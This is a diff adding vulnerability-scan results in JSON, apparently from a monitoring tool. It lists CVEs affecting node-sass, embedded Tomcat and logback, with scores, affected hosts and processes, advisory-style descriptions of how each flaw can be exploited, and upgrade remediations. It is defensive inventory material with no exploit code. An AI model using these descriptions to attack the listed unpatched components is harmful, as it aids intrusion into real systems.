+        "CVE-2018-11694"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "NULL Pointer Dereference",
+      "vulnerability.type": "NULL Pointer Dereference",
+      "vulnerability.description": "[node-sass](https://npmjs.org/package/node-sass) is a Node.js bindings package for libsass.\n\nAffected versions of this package are vulnerable to NULL Pointer Dereference in the function `Sass::Functions::selector_append` which could be leveraged by an attacker to cause a denial of service (application crash) or possibly have unspecified other impact.  `node-sass` is affected by this vulnerability due to its bundled usage of `libsass`.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1B9FD05898DC0602",
+      "affected_entity.vulnerable_component.name": "node-sass:4.14.1",
+      "vulnerability.references.cwe": [
+        "CWE-476"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "15321187953112570643",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1941",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-24813"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.99, 10.1.35, 11.0.3 or higher.",
+      "vulnerability.title": "Path Equivalence",
+      "vulnerability.type": "Path Equivalence: 'file.name' (Internal Dot)",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Path Equivalence in the `doPut()` function in `DefaultServlet.java`, which insecurely replaces path separators with `.`s. \r\n\r\nIf the Default Servlet is configured with writes enabled - which it is not by default - a user can exploit Tomcat's partial `PUT` functionality to achieve code execution via deserialization. The target URL containing sensitive uploaded files must be a sub-directory of a target URL for public uploads, and the malicious user must know the names of the target sensitive files, which are also uploaded using a partial `PUT`. If both attacker and target application are using the default storage location and it contains a library that deserializes untrusted code, the attacker can trigger the execution of malicious code.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-44"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "15432868448139816486",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1690",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.7,
+      "vulnerability.cvss.base_score": 9.2,
+      "vulnerability.references.cve": [
+        "CVE-2024-52316"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.96, 10.1.31, 11.0.0 or higher.",
+      "vulnerability.title": "Uncaught Exception",
+      "vulnerability.type": "Uncaught Exception",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Uncaught Exception due to the custom Jakarta Authentication `ServerAuthContext` component which may throw an exception during the authentication process without setting an HTTP status to indicate failure. An attacker can gain unauthorized access by exploiting this unchecked error condition.\r\n\r\n**Note:**\r\n\r\nThis is only exploitable if Tomcat is configured to use a custom Jakarta Authentication\r\n`ServerAuthContext` component that behaves in this way. According to the maintainers, no such cases are known.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-248"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.7,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "16453914925400342122",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-1089",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 8.6,
+      "vulnerability.references.cve": [
+        "CVE-2023-46589"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 8.5.96, 9.0.83, 10.1.16, 11.0.0-M10 or higher.",
+      "vulnerability.title": "Improper Input Validation",
+      "vulnerability.type": "Improper Input Validation",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Improper Input Validation due to the improper parsing of HTTP trailer headers. An attacker can manipulate the server into treating a single request as multiple requests by sending a trailer header that exceeds the header size limit. This could lead to request smuggling when the server is behind a reverse proxy.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-20"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "16453914925400342122",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1089",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 8.6,
+      "vulnerability.references.cve": [
+        "CVE-2023-46589"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 8.5.96, 9.0.83, 10.1.16, 11.0.0-M10 or higher.",
+      "vulnerability.title": "Improper Input Validation",
+      "vulnerability.type": "Improper Input Validation",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Improper Input Validation due to the improper parsing of HTTP trailer headers. An attacker can manipulate the server into treating a single request as multiple requests by sending a trailer header that exceeds the header size limit. This could lead to request smuggling when the server is behind a reverse proxy.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-20"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "16528046267158391753",
+      "affected_entity.id": "PROCESS_GROUP-04A6A231EA968941",
+      "vulnerability.display_id": "S-1098",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 7.1,
+      "vulnerability.references.cve": [
+        "CVE-2023-6481"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ch.qos.logback:logback-classic` to version 1.2.13, 1.3.14, 1.4.14 or higher.",
+      "vulnerability.title": "Uncontrolled Resource Consumption ('Resource Exhaustion')",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ch.qos.logback:logback-classic](https://mvnrepository.com/artifact/ch.qos.logback/logback-classic) is a reliable, generic, fast and flexible logging library for Java.\n\nAffected versions of this package are vulnerable to Uncontrolled Resource Consumption ('Resource Exhaustion') via the `logback receiver` component. An attacker can mount a denial-of-service attack by sending poisoned data.\r\n\r\n**Note:**\r\n\r\nSuccessful exploitation requires the logback-receiver component being enabled and also reachable by the attacker.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-AA93451F939FDE00",
+      "affected_entity.vulnerable_component.name": "ch.qos.logback:logback-classic:1.2.3",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    }
+]
